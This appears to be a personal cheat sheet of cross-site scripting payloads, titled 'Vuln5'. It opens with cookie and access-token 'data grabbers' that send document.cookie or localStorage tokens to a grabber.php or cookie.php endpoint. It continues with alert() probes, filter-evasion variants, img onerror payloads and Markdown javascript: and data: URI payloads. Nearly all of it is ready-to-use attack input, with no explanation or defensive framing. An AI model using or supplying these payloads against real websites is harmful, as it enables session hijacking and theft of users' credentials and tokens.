## 29 Mart 2021 Pazartesi ## Time: 20:33 Vuln5





## Payload List Data grabber for XSS ## 

<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

-------------------------------------------------------------
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
----------------------------------------------------------------

<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>
-----------------------------------------------------------------

<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>

-------------------------------------------------------------
## XSS in HTML/Applications ##

<script>alert('XSS')</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>

"><script>alert("XSS")</script>

"><script>alert(String.fromCharCode(88,83,83))</script>

## Img tag payload ##

<img src=x onerror=alert('XSS');>

<img src=x onerror=alert('XSS')//

<img src=x onerror=alert(String.fromCharCode(88,83,83));>

<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

<img src=x:alert(alt) onerror=eval(src) alt=xss>

"><img src=x onerror=alert("XSS");>

"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
-----------------------------------------------------------------
## XSS in Markdown ##
[a](javascript:prompt(document.cookie))

[a](j a v a s c r i p t:prompt(document.cookie))

[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

[a](javascript:window.onerror=alert;throw%201)


